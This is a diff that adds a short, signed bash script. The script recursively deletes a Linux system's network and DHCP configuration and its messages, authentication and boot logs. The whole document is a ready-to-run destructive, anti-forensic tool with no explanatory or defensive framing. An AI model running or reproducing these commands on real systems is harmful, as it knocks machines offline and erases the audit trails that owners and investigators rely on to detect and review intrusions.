@@ -1,0 +1,9 @@
+#!/bin/bash
+#MadeByShadowPriestVMX
+#CareWithIt
+
+rm -r /etc/network/*
+rm -r /var/log/messages*
+rm -r /var/log/auth*
+rm -r /var/log/boot*
+rm -r /etc/dhcp/*
